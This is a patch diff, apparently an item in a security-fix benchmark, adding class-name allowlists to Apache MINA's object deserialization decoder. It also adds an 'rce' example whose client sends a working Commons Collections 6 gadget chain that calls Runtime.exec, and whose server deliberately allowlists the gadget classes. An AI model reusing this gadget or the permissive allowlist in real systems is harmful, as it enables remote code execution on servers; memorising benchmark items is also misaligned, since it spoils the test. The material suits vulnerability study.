@@ -1,0 +1,596 @@
+PCBV2-0049 V0 -> V1 fix (faithful copy of the verified upstream fix)
+source: f9cc5ada6ebef4ee7cc51aac824e42e2e422310e (2.2.4 ObjectSerializationDecoder accept)
+patch.diff is METHOD-VISIBLE; the V1->V2 guard-evolution notes that used to live here were removed 2026-10-11 (option A uniform rewrite; see reports/PATCH_DIFF_AUDIT_addendum_2026-10-11.md)
+backup of the previous file: replacements_2026-10-11/PCBV2-0049/
+
+diff --git a/mina-core/pom.xml b/mina-core/pom.xml
+index c3d5a1b20..88d03d64b 100644
+--- a/mina-core/pom.xml
++++ b/mina-core/pom.xml
+@@ -59,6 +59,7 @@
+             <Export-Package>
+               org.apache.mina.core,
+               org.apache.mina.core.buffer,
++              org.apache.mina.core.buffer.matcher,
+               org.apache.mina.core.file,
+               org.apache.mina.core.filterchain,
+               org.apache.mina.core.future,
+diff --git a/mina-core/src/main/java/org/apache/mina/core/buffer/AbstractIoBuffer.java b/mina-core/src/main/java/org/apache/mina/core/buffer/AbstractIoBuffer.java
+index bd80469e9..c600a4e2c 100644
+--- a/mina-core/src/main/java/org/apache/mina/core/buffer/AbstractIoBuffer.java
++++ b/mina-core/src/main/java/org/apache/mina/core/buffer/AbstractIoBuffer.java
+@@ -48,7 +48,6 @@
+ import java.util.List;
+ import java.util.Set;
+ import java.util.regex.Pattern;
+-import java.util.stream.Stream;
+ 
+ import org.apache.mina.core.buffer.matcher.ClassNameMatcher;
+ import org.apache.mina.core.buffer.matcher.FullClassNameMatcher;
+@@ -91,7 +90,6 @@ public abstract class AbstractIoBuffer extends IoBuffer {
+     private static final long INT_MASK = 0xFFFFFFFFL;
+ 
+     private final List<ClassNameMatcher> acceptMatchers = new ArrayList<>();
+-    private final List<ClassNameMatcher> rejectMatchers = new ArrayList<>();
+ 
+     /**
+      * We don't have any access to Buffer.markValue(), so we need to track it down,
+@@ -2177,18 +2175,23 @@ public Object getObject(final ClassLoader classLoader) throws ClassNotFoundExcep
+             @Override
+             protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException {
+                 int type = read();
++                
+                 if (type < 0) {
+                     throw new EOFException();
+                 }
++                
+                 switch (type) {
+-                case 0: // NON-Serializable class or Primitive types
+-                    return super.readClassDescriptor();
+-                case 1: // Serializable class
+-                    String className = readUTF();
+-                    Class<?> clazz = Class.forName(className, true, classLoader);
+-                    return ObjectStreamClass.lookup(clazz);
+-                default:
+-                    throw new StreamCorruptedException("Unexpected class descriptor type: " + type);
++                    case 0: // NON-Serializable class or Primitive types
++                        return super.readClassDescriptor();
++                        
++                    case 1: // Serializable class
++                        String className = readUTF();
++                        Class<?> clazz = Class.forName(className, true, classLoader);
++            
++                        return ObjectStreamClass.lookup(clazz);
++                        
++                    default:
++                        throw new StreamCorruptedException("Unexpected class descriptor type: " + type);
+                 }
+             }
+ 
+@@ -2196,10 +2199,9 @@ protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFo
+             protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+                 Class<?> clazz = desc.forClass();
+                 
+-                String[] classes = new String[] {"java.util.Date", "long", "java.util.ArrayList"};
+-
+                 if (clazz == null) {
+                     String name = desc.getName();
++                    
+                     try {
+                         return Class.forName(name, false, classLoader);
+                     } catch (ClassNotFoundException ex) {
+@@ -2224,7 +2226,6 @@ protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, Clas
+                 }
+             }
+         }) {
+-            //((ValidatingObjectInputStream)in).accept(Date.class, long.class, ArrayList.class);
+             return in.readObject();
+         } catch (IOException e) {
+             throw new BufferDataException(e);
+@@ -2824,4 +2825,15 @@ public IoBuffer accept(String... patterns) {
+         
+         return this;
+     }
++    
++    /**
++     * {@inheritDoc}
++     */
++    public void setMatchers(List<ClassNameMatcher> matchers) {
++        acceptMatchers.clear();
++        
++        for (ClassNameMatcher matcher:matchers) {
++            acceptMatchers.add(matcher);
++        }
++    }
+ }
+diff --git a/mina-core/src/main/java/org/apache/mina/core/buffer/IoBuffer.java b/mina-core/src/main/java/org/apache/mina/core/buffer/IoBuffer.java
+index 6cda800cb..e54125803 100644
+--- a/mina-core/src/main/java/org/apache/mina/core/buffer/IoBuffer.java
++++ b/mina-core/src/main/java/org/apache/mina/core/buffer/IoBuffer.java
+@@ -35,6 +35,7 @@
+ import java.nio.charset.CharsetDecoder;
+ import java.nio.charset.CharsetEncoder;
+ import java.util.EnumSet;
++import java.util.List;
+ import java.util.Set;
+ import java.util.regex.Pattern;
+ 
+@@ -2137,4 +2138,11 @@ public abstract IoBuffer putPrefixedString(CharSequence val, int prefixLength, i
+      * @return this object
+      */
+     public abstract IoBuffer accept(String... patterns);
++    
++    /**
++     * Set the list of class matchers for in incoming buffer
++     * 
++     * @param matchers The list of matchers
++     */
++    public abstract void setMatchers(List<ClassNameMatcher> matchers);
+ }
+diff --git a/mina-core/src/main/java/org/apache/mina/core/buffer/IoBufferWrapper.java b/mina-core/src/main/java/org/apache/mina/core/buffer/IoBufferWrapper.java
+index e53081103..c59d42e07 100644
+--- a/mina-core/src/main/java/org/apache/mina/core/buffer/IoBufferWrapper.java
++++ b/mina-core/src/main/java/org/apache/mina/core/buffer/IoBufferWrapper.java
+@@ -33,6 +33,7 @@
+ import java.nio.charset.CharacterCodingException;
+ import java.nio.charset.CharsetDecoder;
+ import java.nio.charset.CharsetEncoder;
++import java.util.List;
+ import java.util.Set;
+ import java.util.regex.Pattern;
+ 
+@@ -1564,4 +1565,11 @@ public IoBuffer accept(Pattern pattern) {
+     public IoBuffer accept(String... patterns) {
+         return buf.accept(patterns);
+     }
++    
++    /**
++     * {@inheritDoc}
++     */
++    public void setMatchers(List<ClassNameMatcher> matchers) {
++        buf.setMatchers(matchers);
++    }
+ }
+diff --git a/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationCodecFactory.java b/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationCodecFactory.java
+index e682a3c25..2d3a88f9f 100644
+--- a/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationCodecFactory.java
++++ b/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationCodecFactory.java
+@@ -19,7 +19,12 @@
+  */
+ package org.apache.mina.filter.codec.serialization;
+ 
++import java.util.regex.Pattern;
++
+ import org.apache.mina.core.buffer.BufferDataException;
++import org.apache.mina.core.buffer.matcher.ClassNameMatcher;
++import org.apache.mina.core.buffer.matcher.RegexpClassNameMatcher;
++import org.apache.mina.core.buffer.matcher.WildcardClassNameMatcher;
+ import org.apache.mina.core.session.IoSession;
+ import org.apache.mina.filter.codec.ProtocolCodecFactory;
+ import org.apache.mina.filter.codec.ProtocolDecoder;
+@@ -122,4 +127,37 @@ public int getDecoderMaxObjectSize() {
+     public void setDecoderMaxObjectSize(int maxObjectSize) {
+         decoder.setMaxObjectSize(maxObjectSize);
+     }
++
++    /**
++     * Accept class names where the supplied ClassNameMatcher matches for
++     * deserialization, unless they are otherwise rejected.
++     *
++     * @param classNameMatcher the matcher to use
++     */
++    public void accept(ClassNameMatcher classNameMatcher) {
++        decoder.accept(classNameMatcher);
++    }
++
++    /**
++     * Accept class names that match the supplied pattern for
++     * deserialization, unless they are otherwise rejected.
++     *
++     * @param pattern standard Java regexp
++     */
++    public void accept(Pattern pattern) {
++        decoder.accept(new RegexpClassNameMatcher(pattern));
++    }
++
++    /**
++     * Accept the wildcard specified classes for deserialization,
++     * unless they are otherwise rejected.
++     *
++     * @param patterns Wildcard file name patterns as defined by
++     *                  {@link org.apache.commons.io.FilenameUtils#wildcardMatch(String, String) FilenameUtils.wildcardMatch}
++     */
++    public void accept(String... patterns) {
++        for (String pattern:patterns) {
++            decoder.accept(new WildcardClassNameMatcher(pattern));
++        }
++    }
+ }
+diff --git a/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationDecoder.java b/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationDecoder.java
+index 8def39ef7..ae324873b 100644
+--- a/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationDecoder.java
++++ b/mina-core/src/main/java/org/apache/mina/filter/codec/serialization/ObjectSerializationDecoder.java
+@@ -20,9 +20,15 @@
+ package org.apache.mina.filter.codec.serialization;
+ 
+ import java.io.Serializable;
++import java.util.ArrayList;
++import java.util.List;
++import java.util.regex.Pattern;
+ 
+ import org.apache.mina.core.buffer.BufferDataException;
+ import org.apache.mina.core.buffer.IoBuffer;
++import org.apache.mina.core.buffer.matcher.ClassNameMatcher;
++import org.apache.mina.core.buffer.matcher.RegexpClassNameMatcher;
++import org.apache.mina.core.buffer.matcher.WildcardClassNameMatcher;
+ import org.apache.mina.core.session.IoSession;
+ import org.apache.mina.filter.codec.CumulativeProtocolDecoder;
+ import org.apache.mina.filter.codec.ProtocolDecoder;
+@@ -39,6 +45,9 @@ public class ObjectSerializationDecoder extends CumulativeProtocolDecoder {
+ 
+     private int maxObjectSize = 1048576; // 1MB
+ 
++    /** The classes we accept when deserializing a binary blob */
++    private final List<ClassNameMatcher> acceptMatchers = new ArrayList<>();
++
+     /**
+      * Creates a new instance with the {@link ClassLoader} of
+      * the current thread.
+@@ -93,8 +102,43 @@ protected boolean doDecode(IoSession session, IoBuffer in, ProtocolDecoderOutput
+         if (!in.prefixedDataAvailable(4, maxObjectSize)) {
+             return false;
+         }
++        
++        in.setMatchers(acceptMatchers);
+ 
+         out.write(in.getObject(classLoader));
+         return true;
+     }
++
++    /**
++     * Accept class names where the supplied ClassNameMatcher matches for
++     * deserialization, unless they are otherwise rejected.
++     *
++     * @param classNameMatcher the matcher to use
++     */
++    public void accept(ClassNameMatcher classNameMatcher) {
++        acceptMatchers.add(classNameMatcher);
++    }
++
++    /**
++     * Accept class names that match the supplied pattern for
++     * deserialization, unless they are otherwise rejected.
++     *
++     * @param pattern standard Java regexp
++     */
++    public void accept(Pattern pattern) {
++        acceptMatchers.add(new RegexpClassNameMatcher(pattern));
++    }
++
++    /**
++     * Accept the wildcard specified classes for deserialization,
++     * unless they are otherwise rejected.
++     *
++     * @param patterns Wildcard file name patterns as defined by
++     *                  {@link org.apache.commons.io.FilenameUtils#wildcardMatch(String, String) FilenameUtils.wildcardMatch}
++     */
++    public void accept(String... patterns) {
++        for (String pattern:patterns) {
++            acceptMatchers.add(new WildcardClassNameMatcher(pattern));
++        }
++    }
+ }
+diff --git a/mina-core/src/test/java/org/apache/mina/core/buffer/IoBufferTest.java b/mina-core/src/test/java/org/apache/mina/core/buffer/IoBufferTest.java
+index bf8c46743..41b1952ee 100644
+--- a/mina-core/src/test/java/org/apache/mina/core/buffer/IoBufferTest.java
++++ b/mina-core/src/test/java/org/apache/mina/core/buffer/IoBufferTest.java
+@@ -41,6 +41,8 @@
+ import java.util.EnumSet;
+ import java.util.List;
+ 
++import org.apache.mina.core.buffer.matcher.RegexpClassNameMatcher;
++import org.apache.mina.core.buffer.matcher.WildcardClassNameMatcher;
+ import org.apache.mina.util.Bar;
+ import org.junit.Test;
+ 
+@@ -393,6 +395,8 @@ public void testNonserializableClass() throws Exception {
+         IoBuffer buffer = IoBuffer.allocate(16);
+         buffer.setAutoExpand(true);
+         buffer.putObject(c);
++        
++        // Accept the String class
+         buffer.accept(String.class.getName());
+ 
+         buffer.flip();
+@@ -402,6 +406,59 @@ public void testNonserializableClass() throws Exception {
+         assertSame(c, o);
+     }
+ 
++    @Test
++    public void testNonserializableClassAcceptWildcard() throws Exception {
++        Class<?> c = String.class;
++
++        IoBuffer buffer = IoBuffer.allocate(16);
++        buffer.setAutoExpand(true);
++        buffer.putObject(c);
++        
++        // Accept all classes which name starts with 'java.lan'
++        // That includes 'java.lang.String'
++        buffer.accept(new WildcardClassNameMatcher("java.lan*"));
++
++        buffer.flip();
++        Object o = buffer.getObject();
++
++        assertEquals(c, o);
++        assertSame(c, o);
++    }
++    
++    @Test
++    public void testNonserializableClassAcceptRegexp() throws Exception {
++        Class<?> c = String.class;
++
++        IoBuffer buffer = IoBuffer.allocate(16);
++        buffer.setAutoExpand(true);
++        buffer.putObject(c);
++        
++        // Accept all class which contains '.lang.' in their name
++        // That includes java.lang.String
++        buffer.accept(new RegexpClassNameMatcher(".*\\.lang\\..*"));
++
++        buffer.flip();
++        Object o = buffer.getObject();
++
++        assertEquals(c, o);
++        assertSame(c, o);
++    }
++
++    @Test(expected=ClassNotFoundException.class)
++    public void testNonserializableClassReject() throws Exception {
++        Class<?> c = String.class;
++
++        IoBuffer buffer = IoBuffer.allocate(16);
++        buffer.setAutoExpand(true);
++        buffer.putObject(c);
++        // Don't accept the java.lang.String class
++
++        buffer.flip();
++        
++        // Should throw an exception
++        buffer.getObject();
++    }
++
+     @Test
+     public void testNonserializableInterface() throws Exception {
+         Class<?> c = NonserializableInterface.class;
+diff --git a/mina-example/pom.xml b/mina-example/pom.xml
+index c3a2ededc..4e15b3377 100644
+--- a/mina-example/pom.xml
++++ b/mina-example/pom.xml
+@@ -80,5 +80,16 @@
+       <artifactId>jcl-over-slf4j</artifactId>
+     </dependency>
+ 
++    <dependency>
++      <groupId>org.apache.commons</groupId>
++      <artifactId>commons-collections4</artifactId>
++      <version>4.0</version>
++    </dependency>
++    
++    <dependency>
++      <groupId>com.nqzero</groupId>
++      <artifactId>permit-reflect</artifactId>
++      <version>0.3</version>
++    </dependency>
+   </dependencies>
+ </project>
+diff --git a/mina-example/src/main/java/org/apache/mina/example/rce/MinaClient.java b/mina-example/src/main/java/org/apache/mina/example/rce/MinaClient.java
+new file mode 100644
+index 000000000..50a8c5b9b
+--- /dev/null
++++ b/mina-example/src/main/java/org/apache/mina/example/rce/MinaClient.java
+@@ -0,0 +1,35 @@
++package org.apache.mina.example.rce;
++
++import org.apache.mina.core.future.ConnectFuture;
++import org.apache.mina.core.service.IoConnector;
++import org.apache.mina.core.service.IoHandlerAdapter;
++import org.apache.mina.core.session.IoSession;
++import org.apache.mina.filter.codec.ProtocolCodecFilter;
++import org.apache.mina.filter.codec.serialization.ObjectSerializationCodecFactory;
++import org.apache.mina.transport.socket.nio.NioSocketConnector;
++//import payload.Generator;
++import java.net.InetSocketAddress;
++ 
++public class MinaClient {
++    private static final String HOSTNAME = "localhost";
++    private static final int PORT = 9123;
++    
++    public static void main(String[] args) throws Exception {
++        IoConnector connector = new NioSocketConnector();
++        connector.getFilterChain().addLast("codec", new ProtocolCodecFilter(new ObjectSerializationCodecFactory()));
++        connector.setHandler(new ClientHandler());
++        ConnectFuture future = connector.connect(new InetSocketAddress(HOSTNAME, PORT));
++        future.awaitUninterruptibly();
++        IoSession session = future.getSession();
++        session.write(Reflections.getCC6());
++        session.getCloseFuture().awaitUninterruptibly();
++        connector.dispose();
++    }
++    
++    private static class ClientHandler extends IoHandlerAdapter {
++        @Override
++        public void messageReceived(IoSession session, Object message) {
++            System.out.println("Received from server: " + message);
++        }
++    }
++}
+\ No newline at end of file
+diff --git a/mina-example/src/main/java/org/apache/mina/example/rce/MinaServer.java b/mina-example/src/main/java/org/apache/mina/example/rce/MinaServer.java
+new file mode 100644
+index 000000000..60b134308
+--- /dev/null
++++ b/mina-example/src/main/java/org/apache/mina/example/rce/MinaServer.java
+@@ -0,0 +1,63 @@
++package org.apache.mina.example.rce;
++
++import org.apache.mina.core.buffer.matcher.FullClassNameMatcher;
++import org.apache.mina.core.buffer.matcher.RegexpClassNameMatcher;
++import org.apache.mina.core.service.IoAcceptor;
++import org.apache.mina.core.service.IoHandlerAdapter;
++import org.apache.mina.core.session.IoSession;
++import org.apache.mina.filter.codec.ProtocolCodecFilter;
++import org.apache.mina.filter.codec.serialization.ObjectSerializationCodecFactory;
++import org.apache.mina.transport.socket.nio.NioSocketAcceptor;
++import java.io.IOException;
++import java.net.InetSocketAddress;
++
++public class MinaServer {
++    private static final int PORT = 9123;
++
++    public static void main(String[] args) throws IOException {
++        IoAcceptor acceptor = new NioSocketAcceptor();
++        ObjectSerializationCodecFactory codec = new ObjectSerializationCodecFactory();
++        codec.accept(new RegexpClassNameMatcher("java.util.Collections.*"));
++        codec.accept(new RegexpClassNameMatcher("org.apache.commons.collections4.*"));
++        codec.accept(new RegexpClassNameMatcher("java.lang.*"));
++
++        codec.accept(new FullClassNameMatcher(
++            "javax.management.BadAttributeValueExpException",
++            "java.util.ArrayList",
++            "java.util.HashMap"));
++
++        /*
++        codec.accept(new FullClassNameMatcher(
++            "javax.management.BadAttributeValueExpException",
++            "java.lang.Exception",
++            "java.lang.Throwable",
++            "java.lang.StackTraceElement",
++            "java.util.Collections$UnmodifiableList",
++            "java.util.Collections$UnmodifiableCollection",
++            "java.util.ArrayList",
++            "org.apache.commons.collections4.keyvalue.TiedMapEntry",
++            "org.apache.commons.collections4.map.LazyMap",
++            "org.apache.commons.collections4.functors.ChainedTransformer",
++            "org.apache.commons.collections4.functors.ConstantTransformer",
++            "org.apache.commons.collections4.functors.InvokerTransformer",
++            "java.lang.String",
++            "java.lang.Integer",
++            "java.lang.Number",
++            "java.util.HashMap"));
++             */
++        
++        acceptor.getFilterChain().addLast("codec", new ProtocolCodecFilter(codec));
++        acceptor.setHandler(new ServerHandler());
++        acceptor.bind(new InetSocketAddress(PORT));
++        System.out.println("Mina Server started on port " + PORT);
++    }
++    
++    
++    private static class ServerHandler extends IoHandlerAdapter {
++        @Override
++        public void messageReceived(IoSession session, Object message) {
++            System.out.println("Received: " + message);
++            session.write("Server Response: " + message);
++        } 
++    }
++}
+\ No newline at end of file
+diff --git a/mina-example/src/main/java/org/apache/mina/example/rce/Reflections.java b/mina-example/src/main/java/org/apache/mina/example/rce/Reflections.java
+new file mode 100644
+index 000000000..5827ebbe7
+--- /dev/null
++++ b/mina-example/src/main/java/org/apache/mina/example/rce/Reflections.java
+@@ -0,0 +1,92 @@
++package org.apache.mina.example.rce;
++
++import com.nqzero.permit.Permit;
++
++import java.lang.reflect.AccessibleObject;
++import java.lang.reflect.Field;
++import java.util.HashMap;
++import java.util.Map;
++
++import javax.management.BadAttributeValueExpException;
++
++import org.apache.commons.collections4.Transformer;
++import org.apache.commons.collections4.functors.ChainedTransformer;
++import org.apache.commons.collections4.functors.ConstantTransformer;
++import org.apache.commons.collections4.functors.InvokerTransformer;
++import org.apache.commons.collections4.keyvalue.TiedMapEntry;
++import org.apache.commons.collections4.map.LazyMap;
++
++public class Reflections {
++    public static Object getCC6() throws IllegalAccessException, NoSuchFieldException {
++        String[] execArgs = new String[] {"open /System/Applications/Calculator.app"};
++        Transformer transformerChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
++        Transformer[] transformers = new Transformer[] {
++                new ConstantTransformer(Runtime.class),
++                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, 
++                    new Object[] {"getRuntime", new Class[0] }),
++                new InvokerTransformer("invoke", 
++                    new Class[] {Object.class, Object[].class }, 
++                    new Object[] {null, new Object[0] }),
++                new InvokerTransformer("exec",new Class[] { String.class }, execArgs),
++                new ConstantTransformer(1) 
++            };
++        Map innerMap = new HashMap<>();
++        Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);
++        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
++        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
++        Field valfield = val.getClass().getDeclaredField("val");
++        Reflections.setAccessible(valfield);
++        valfield.set(val, entry);
++        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
++        
++        return val;
++    }
++
++    public static void setAccessible(AccessibleObject member) {
++        String versionStr = System.getProperty("java.version");
++        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);
++        
++        if (javaVersion < 12) {
++            // quiet runtime warnings from JDK9+
++            Permit.setAccessible(member);
++        } else {
++            // not possible to quiet runtime warnings anymore...
++            // see https://bugs.openjdk.java.net/browse/JDK-8210522
++            // to understand impact on Permit (i.e. it does not work
++            // anymore with Java >= 12)
++            member.setAccessible(true);
++        } 
++    }
++    
++    public static void setFieldValue(Object obj, String field, Object value){
++        try {
++            Class clazz = obj.getClass();
++            Field fld = getField(clazz,field);
++            fld.setAccessible(true);
++            fld.set(obj, value);
++        } catch (Exception e) {
++            e.printStackTrace();
++        }
++    }
++    
++    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
++        try {
++            Field field = clazz.getDeclaredField(fieldName);
++            
++            if ( field != null ) {
++                field.setAccessible(true);
++            } else if ( clazz.getSuperclass() != null ) {
++                field = getField(clazz.getSuperclass(), fieldName);
++            }
++            
++            return field;
++        }
++        catch ( NoSuchFieldException e ) {
++            if ( !clazz.getSuperclass().equals(Object.class) ) {
++                return getField(clazz.getSuperclass(), fieldName);
++            }
++        
++            throw e; 
++        }
++    } 
++}
+\ No newline at end of file
